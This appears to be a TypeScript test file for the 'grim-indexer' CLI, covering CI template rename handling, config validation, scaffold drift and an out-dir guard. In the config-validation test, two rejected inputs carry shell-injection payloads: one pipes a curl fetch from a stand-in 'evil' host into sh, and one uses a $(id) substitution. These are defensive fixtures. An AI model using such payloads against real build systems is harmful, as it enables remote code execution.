  // passed with the flag deleted. Found by mutating the templates.
  it("collects both sides of a rename, on either forge", async () => {
    const command = (text: string, needle: string) =>
      text
        .split("\n")
        .filter((line) => line.includes(needle) && !line.trim().startsWith("#"))
        .join(" ");

    const gitlab = shellLines(await forgeDir({ forge: "gitlab" }, "rename-gl"), "gitlab").join("\n");
    expect(command(gitlab, "git diff"), "git reports a rename as the destination alone").toContain(
      "--no-renames",
    );

    const github = shellLines(await forgeDir({ forge: "github" }, "rename-gh"), "github").join("\n");
    expect(command(github, "jq"), "the API carries the source as previous_filename").toContain(
      "previous_filename",
    );
    // And a record that claims to be a rename without naming its source is
    // refused, rather than silently contributing only its destination.
    expect(command(github, "orphans="), "a source-less rename fails the job").toContain("renamed");
  });
});

describe("config validation", () => {
  it("rejects a ci block the renderer could not honour", () => {
    for (const bad of [
      { forge: "bitbucket" },
      // One repo, one forge: `both` was a value once and is not one now.
      { forge: "both" },
      { nodeVersion: 22 },
      { enrich: "yes" },
      // These land inside a double-quoted shell word or a docker image tag in
      // the generated YAML; a value carrying a quote or a pipe would rewrite
      // the command around it, and no version string needs either.
      { grimVersion: '0.1.0"; curl evil|sh' },
      { nodeVersion: "22-alpine$(id)" },
      { autoMerge: "yes" },
      // Refused rather than rendered inert: a repository that asked for
      // auto-merge and silently did not get it believes contributions land by
      // themselves, and the GitLab gate cannot be made tamper-proof.
      { forge: "gitlab", autoMerge: true },
    ]) {
      expect(() => validateCi(bad), JSON.stringify(bad)).toThrow(SiteConfigError);
    }
  });

  it("accepts an absent block and a plain version", () => {
    expect(validateCi(undefined)).toEqual({});
    expect(validateCi({ grimVersion: "v0.12.0" })).toEqual({ grimVersion: "v0.12.0" });
  });

  it("treats a missing index.config.json as defaults", async () => {
    expect(await loadCiConfig(dir)).toEqual({});
  });
});

// The scaffold renders its CI through `renderCi` from the `ci` block it wrote
// itself, so the guard it ships passes on the very first push. If these two
// ever disagreed, every new index would open with red CI and a drift report
// against files nobody had touched.
describe("init and ci agree", () => {
  // `--no-install` keeps the network out of it: the scaffold's own `npm
  // install` resolves a lock from whatever is published today, and nothing
  // here depends on the lock's contents.
  it("scaffolds a tree that is born drift-free", async () => {
    for (const forge of FORGES) {
      const root = path.join(dir, `init-${forge}`);
      const args = ["--quick", "--no-git", "--no-install", "--forge", forge];
      expect(await run(["node", "grim-indexer", "init", root, ...args]), forge).toBe(0);

      expect(await check(root), forge).toBe(0);
      expect(errors, forge).toEqual([]);
    }
  });
});

// The dev server is deliberately not booted here: Astro's dev server does not
// nest inside vitest's own Vite, which is why this repo drives it from
// `scripts/dev.mjs --smoke` instead. What is testable without a server is
// that the command exists and that its shared out-dir guard holds.
describe("dev", () => {
  it("is a registered command", async () => {
    expect(await run(["node", "grim-indexer", "dev", "--help"])).toBe(0);

    // Its own help, not the program's — an unregistered name would fall
    // through to the top-level usage and still exit 0.
    expect(stdout.join("")).toContain("grim-indexer dev");
    expect(stdout.join("")).toMatch(/--out-dir[\s\S]*--port/);
  });

  // `compileIndex` removes `outDir` before it writes, so an out-dir that is
  // the index root — or an ancestor of it — deletes the index it is about to
  // compile. `dev` and `build` share the guard because they share that step.
  it("refuses an out-dir that contains the index root", () => {
    for (const outDir of [".", ".."]) {
      expect(() => resolveOutDir(dir, outDir), outDir).toThrow(/would delete it/);
    }
    expect(resolveOutDir(dir, "dist")).toBe(path.join(dir, "dist"));

    let code: number | undefined;
    try {
      resolveOutDir(dir, ".");
    } catch (err) {
      code = (err as CliError).code;
    }
    expect(code, "a bad flag value is a usage error").toBe(EXIT.usage);
  });
});
